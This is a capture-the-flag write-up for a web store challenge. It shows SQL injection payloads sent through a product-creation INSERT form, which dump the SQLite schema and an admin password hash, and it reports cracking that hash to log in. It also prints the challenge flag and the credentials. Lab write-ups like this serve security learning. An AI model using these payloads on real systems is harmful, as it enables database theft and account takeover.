# Hacker Web Store
Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.

This challenge may require a local password list, which we have provided below. Reminder, bruteforcing logins is not necessary and against the rules.

# Flag
flag{87257f24fd71ea9ed8aa62837e768ec0}

# Solution
Vulnerable to SQL Injection when executing INSERT statements to create new products. 

Assuming SQL statement is similar to this:

```sql
INSERT INTO products (name,price,desc)
VALUES ('test',2,'test');
```

Injecting: `name=test',10,(select+sqlite_version()))--+-&price=4&desc=hi`
```
3.31.1
```

Injecting: `name=test',10,(select+sql+from+sqlite_master))--+-&price=4&desc=hi`
```
CREATE TABLE users ( id INTEGER NOT NULL, name VARCHAR(100), password VARCHAR(100) NOT NULL, PRIMARY KEY (id) )
```

Injecting: `name=test',10,(select+id||CHAR(32)||name||CHAR(32)||password+from+users+where+id=3))--+-&price=4&desc=hi`
```
3 website_admin_account pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
```

Tried to use hashcat to crack but to no avail. Eventually used a script (see `brute.py`) 

```
[*] Hash cracked! (ntadmin1234):True
That took 37.410451889038086 seconds
```

Logging into the admin portal with the credentials (`website_admin_account:ntadmin1234`) gives the flag.

